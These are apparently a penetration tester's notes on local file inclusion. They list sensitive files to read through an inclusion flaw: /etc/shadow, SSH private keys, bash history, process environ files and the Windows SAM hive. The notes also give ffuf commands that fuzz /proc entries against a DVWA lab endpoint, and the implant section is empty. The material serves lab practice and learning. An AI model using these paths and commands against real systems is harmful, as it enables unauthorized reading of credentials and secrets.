# Manual

## Enumeration

### Cross Platform

Check for `disable_functions`.

```
phpinfo.php
```

### Linux

```
/etc/group
/etc/shadow
/home/<username>/.ssh/id_rsa
/root/.ssh/id_rsa
/etc/crontab
/home/<username>/.bash_history

/etc/os-release

/etc/hosts
/etc/resolv.conf
/proc/net/tcp
/proc/net/udp
/proc/net/arp
/proc/net/dev

/etc/ssh/sshd_config

/proc/self/cmdline
/proc/<pid>/cmdline

/proc/self/environ
/proc/<pid>/environ

/proc/self/cwd
/proc/<pid>/cwd

/proc/self/fd/<pid>

/proc/self/stat
/proc/self/status
/proc/mounts
```

```
$ ffuf -u "http://dvwa.local/dvwa/vulnerabilities/fi/?page=FUZZ" -b "PHPSESSID=<PHP_cookie_session_ID>;security=low" -c -w <(for i in $(seq 10000); echo "/proc/$i/cmdline") -mc 200


$ ffuf -u "http://dvwa.local/dvwa/vulnerabilities/fi/?page=FUZZ" -b "PHPSESSID=<PHP_cookie_session_ID>;security=low" -c -w <(for i in $(seq 10000); echo "/proc/$i/fd") -mc 200
```

### Windows

```
/WINDOWS/repair/sam
/WINDOWS/repair/system
```

## Exploit

### Spawn Implant

TODO: Upload any file extension to load a php implant

```

```

---
## References

- [[02 - File Inclusion Payloads|File Inclusion Payloads]]

- [Hacking Articles: Comprehensive Guide on Local File Inclusion (LFI)](https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/)

- [File Inclusion (Local/Remote)](https://notes.defendergb.org/web-sec/vuln/lfi-rfi)